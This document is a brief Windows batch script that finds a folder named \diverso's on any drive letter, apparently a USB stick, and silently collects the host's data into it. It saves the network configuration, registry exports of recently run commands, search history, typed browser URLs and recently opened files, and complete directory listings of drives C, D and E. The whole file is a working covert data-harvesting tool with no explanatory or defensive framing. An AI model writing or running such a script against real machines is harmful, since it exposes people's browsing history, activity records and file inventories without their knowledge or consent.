set p=\diverso's
for %%i in (c: d: e: f: g: h: i: j: k: l: m: n: o: p: q: r: s: t: u: v: w: x: y: z:) do if exist "%%i%p%" set d="%%i%p%"
md %d%\InfoVit
set d=%d%\Infovit
ipconfig>%d%\IPPC.txt
reg export HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU %d%\DigitExecut.reg
reg export "HKCU\Software\Microsoft\Search Assistant\ACMru" %d%\DigitPesquiz.reg
reg export "HKCU\Software\Microsoft\Internet Explorer\TypedURLs" %d%\Url'sDigit.reg
reg export HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32 %d%\RecentArquiv.reg
Tree/f c:\>%d%\DiskC.txt
tree/f d:\>%d%\DiskD.txt
tree/f e:\>%d%\DiskE.txt